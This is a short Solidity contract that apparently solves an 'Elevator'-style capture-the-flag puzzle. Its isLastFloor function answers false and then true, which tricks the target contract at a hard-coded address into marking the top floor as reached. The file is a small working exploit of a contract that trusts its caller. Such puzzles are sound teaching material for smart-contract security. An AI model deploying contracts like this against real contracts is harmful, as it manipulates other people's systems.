pragma solidity ^0.6.0;

contract Elevator {
  function goTo(uint) public {}
}

contract Counter {

    bool toggle = false;

    function isLastFloor(uint) external returns (bool) {
        if(toggle){
            return true;
        }
        toggle = true;
        return false;
    }

    constructor() public {
        Elevator(0xcBD906e7ba459CfC36D3e7591F50faa49763BC8E).goTo(3);
    }
}

